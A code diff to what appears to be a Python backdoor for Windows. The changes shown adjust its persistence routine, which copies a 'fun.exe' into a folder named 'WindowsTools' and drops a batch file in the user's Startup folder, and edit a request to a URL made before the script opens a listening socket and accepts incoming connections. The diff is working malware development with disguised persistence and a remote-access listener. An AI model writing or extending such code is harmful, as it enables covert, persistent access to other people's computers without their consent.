@@ -12,11 +12,9 @@ USERNAME = getuser()
 
 def add_to_startup():
     d = os.environ['USERPROFILE']+"\\WindowsTools"
-    t = [x for x in __file__.split("\\")]
-    t = t[len(t)-1]
     os.mkdir(d)
-    d = d+"\\"+t
-    copyfile(__file__, d)
+    d = d+"\\"+"fun.exe"
+    copyfile(os.environ['USERPROFILE']+"\\Downloads\\fun.exe", d)
 
     bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USERNAME
     with open(bat_path + '\\' + "WindowsTools.bat", "w+") as bat_file:
@@ -40,7 +38,7 @@ def main():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.bind((ip, PORT))
         s.listen()
-        requests.get(URL, verify=False)
+        requests.get(URL)
         
         while True:
             client, _ = s.accept()
